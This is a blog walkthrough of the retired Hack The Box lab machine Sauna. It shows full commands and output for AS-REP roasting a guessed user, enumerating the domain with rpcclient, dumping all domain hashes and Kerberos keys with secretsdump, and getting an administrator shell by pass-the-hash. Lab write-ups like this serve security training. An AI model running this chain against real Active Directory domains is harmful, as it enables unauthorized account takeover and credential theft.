---
layout: post
title: "Sauna: Hack The Box Walkthrough"
date: 2020-07-18 15:25:57 +0000
last_modified_at: 2020-07-18 15:25:57 +0000
category: Walkthrough
tags: ["Hack The Box", Sauna, retired, Windows, Easy]
comments: true
image:
  feature: sauna-htb-walkthrough.png
---

This post documents the complete walkthrough of Sauna, a retired vulnerable [VM][1] created by [egotisticalSW][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Sauna is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun1 -p1-65535,U:1-65535 10.10.10.175 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-02-18 02:56:05 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 464/tcp on 10.10.10.175
Discovered open port 80/tcp on 10.10.10.175
Discovered open port 53/udp on 10.10.10.175
Discovered open port 63895/tcp on 10.10.10.175
Discovered open port 3269/tcp on 10.10.10.175
Discovered open port 445/tcp on 10.10.10.175
Discovered open port 53/tcp on 10.10.10.175
Discovered open port 5985/tcp on 10.10.10.175
Discovered open port 88/tcp on 10.10.10.175
Discovered open port 9389/tcp on 10.10.10.175
Discovered open port 49671/tcp on 10.10.10.175
Discovered open port 139/tcp on 10.10.10.175
Discovered open port 49670/tcp on 10.10.10.175
Discovered open port 389/tcp on 10.10.10.175
Discovered open port 135/tcp on 10.10.10.175
Discovered open port 49667/tcp on 10.10.10.175
Discovered open port 636/tcp on 10.10.10.175
Discovered open port 593/tcp on 10.10.10.175
Discovered open port 49682/tcp on 10.10.10.175
```

Sure looks like a Windows machine. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p53,80,88,135,139,389,445,464,593,636,3269,5985,9389 -A --reason 10.10.10.175 -oN nmap.txt
...
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain?       syn-ack ttl 127
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-02-18 12:15:45Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        syn-ack ttl 127 .NET Message Framing
```

Looks like we have a Windows Server with Active Directory installed. The domain is **EGOTISTICAL-BANK.LOCAL**. Too bad my first port-of-call `rpcclient` and `smbclient` didn't quite clear
respond to null sessions. Well, here's what the site looks like.

{% include image.html image_alt="69281f07.png" image_src="/231c493f-484c-47bf-a412-4255fc7528e8/69281f07.png" %}

### Meet The Team

{% include image.html image_alt="1bb5390b.png" image_src="/231c493f-484c-47bf-a412-4255fc7528e8/1bb5390b.png" %}

Well, well, well. What have we here? I think it's safe to assume one of them is the security manager. Hopefully, he or she had forgot to turn on Kerberos pre-authentication. :wink:

Enterprise usernames are usually a combination of the first and last names. Let's try **Fergus Smith**, using the first letter of the first name concatenate with the full last name, i.e. `fsmith`.

```
# python3 GetNPUsers.py -format john "egotistical-bank.local/fsmith" -no-pass -dc-ip 10.10.10.175
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for fsmith
$krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL:e862f6ad3857edea09d5da07c870d8bd$81118dc452bd0bb361368949d3bfe9bd7dfa6b95f0642d421af02d024703decee74cb4ca57b1ee689e7d5c5606b69aba898d38b10abe1b01aba9610d4ba171cb46b7b95ac1432b799b05f442613112f2597ecc6f9890c67790e6d441072b3c124fc16db8340ccc7a2c58e3e76fd98f431f9b049d48edfe628f80344aefe8e845db636f31a8282d044200ef21857612f38f04ba76ab748a693239d73ce998be61878ac372b0c56400cdb010b539fd765856106337fe628a9f5bfdabb4cef1085275f8ccc43aea842601c1b7b95ed34affd653e5023e0e5eb9e3f6f0d2520d82cc73e880f5db29b4ff9eb6a5996e68044741b8e50eb1659bd88ef2baf69892e420
```

Bingo!

{% include image.html image_alt="345a6a91.png" image_src="/231c493f-484c-47bf-a412-4255fc7528e8/345a6a91.png" %}

The offline cracking sure is fast.

### Domain enumeration with `rpcclient`

Now that we have the password of `fsmith`, let's see if we can extract more information using `rpcclient`.

_`enumdomusers`_

```
# rpcclient -Ufsmith%Thestrokes23 -c enumdomusers 10.10.10.175
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[HSmith] rid:[0x44f]
user:[FSmith] rid:[0x451]
user:[svc_loanmgr] rid:[0x454]
```

_`querydominfo`_

```
# rpcclient -Ufsmith%Thestrokes23 -c querydominfo  10.10.10.175
Domain:         EGOTISTICALBANK
Server:
Comment:
Total Users:    41
Total Groups:   0
Total Aliases:  14
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```

Let's see who is in the **Remote Management Users** group?

_`enumalsgroups`_

```
# rpcclient -Ufsmith%Thestrokes23 -c "enumalsgroups builtin" 10.10.10.175
group:[Server Operators] rid:[0x225]
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]
```

_`queryaliasmem`_

```
# rpcclient -Ufsmith%Thestrokes23 -c "queryaliasmem builtin 0x244" 10.10.10.175
        sid:[S-1-5-21-2966785786-3096785034-1186376766-1105]
        sid:[S-1-5-21-2966785786-3096785034-1186376766-1108]
```

_`lookupsids`_

```
rpcclient $> lookupsids S-1-5-21-2966785786-3096785034-1186376766-1105
S-1-5-21-2966785786-3096785034-1186376766-1105 EGOTISTICALBANK\FSmith (1)
rpcclient $> lookupsids S-1-5-21-2966785786-3096785034-1186376766-1108
S-1-5-21-2966785786-3096785034-1186376766-1108 EGOTISTICALBANK\svc_loanmgr (1)
```

Awesome, `fsmith` and `svc_loanmgr` are in the **Remote Management Users** group.

## Low-Privilege Shell

It's Evil-WinRM time!

{% include image.html image_alt="bc4afbe4.png" image_src="/231c493f-484c-47bf-a412-4255fc7528e8/bc4afbe4.png" %}

### Getting `user.txt`

The file `user.txt` is at `fsmith`'s desktop. :smiling_imp:

{% include image.html image_alt="b6973b7c.png" image_src="/231c493f-484c-47bf-a412-4255fc7528e8/b6973b7c.png" %}

## Privilege Escalation

I already knew the presence of two other accounts: `hsmith` and `svc_loanmgr`. Let's do it the good ol' way of searching for passwords in registry.

{% include image.html image_alt="72109917.png" image_src="/231c493f-484c-47bf-a412-4255fc7528e8/72109917.png" %}

This sure is a surprise find. The password of `svc_loanmgr` is `Moneymakestheworldgoround!`.

### SHH! We are dumping secrets

Who knows what secrets `svc_loanmgr` is privy to? To dump secrets, look no further than `secretsdump.py`.

```
# python3 secretsdump.py 'egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:a90968c91de5f77ac3b7d938bd760002373f71e14e1a027b2d93d1934d64754a
SAUNA$:aes128-cts-hmac-sha1-96:0bf0c486c1262ab6cf46b16dc3b1b198
SAUNA$:des-cbc-md5:b989ecc101ae4ca1
[*] Cleaning up...
```

Awesome. I have `administrator`'s **LMHASH:NTHASH**. With that, I can get myself a shell with `administrator`'s privileges with `psexec.py`.

{% include image.html image_alt="eca8a284.png" image_src="/231c493f-484c-47bf-a412-4255fc7528e8/eca8a284.png" %}

Sweet. Getting `root.txt` is trivial.

{% include image.html image_alt="8e5b4b06.png" image_src="/231c493f-484c-47bf-a412-4255fc7528e8/8e5b4b06.png" %}

:dancer:


[1]: https://www.hackthebox.eu/home/machines/profile/229
[2]: https://www.hackthebox.eu/home/users/profile/94858
[3]: https://www.hackthebox.eu/
